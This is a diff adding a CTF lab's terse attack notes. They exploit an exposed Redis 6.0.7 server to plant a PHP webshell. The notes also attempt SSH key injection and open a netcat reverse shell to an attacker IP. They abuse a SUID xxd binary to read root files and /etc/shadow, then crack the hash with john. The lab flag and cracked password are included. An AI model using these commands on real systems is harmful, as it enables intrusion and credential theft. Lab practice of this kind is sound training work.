@@ -1,0 +1,40 @@
+Res:
+80
+6379 (Redis 6.0.7)
+tried some metasploit modules, didn’t work right
+nc 10.10.143.42 6379
+got a REDIS prompt?
+found article on pentesting redis 
+https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
+config set dir /var/www/html
+config set dbfilename redis.php
+set test “<?php phpinfo(); ?>”
+works we have RCE
+set test "<?php system($_GET['cmd']);?>"
+http://10.10.143.42/shell.php?cmd=id
+webshell
+SSH
+Decided to follow the pentest guide and add ssh keys to the box via redis
+ssh-keygen -t rsa
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt
+cat spaced_key.txt | redis-cli -h 10.10.13.15 -x set ssh_key
+didn’t work, ssh is closed dummy
+Webshell
+tried inputting many revshells, eventually this worked
+nc -c sh 10.6.15.130 4444
+Reverse Shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+Priv Esc
+found that xxd has SUID bit set
+can be used for file reads?
+xxd “/root/root.txt” | xxd -r
+thm{xxd_pr1v_escalat1on}
+Vianka Password
+I am also supposed to get vianka user password
+used xxd vuln to put /etc/shadow and password into /tmp/password shadow
+cd /tmp; python -m SimpleHTTPServer
+Downloaded to kali
+unshadow password.txt shadow.txt > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+beautiful1
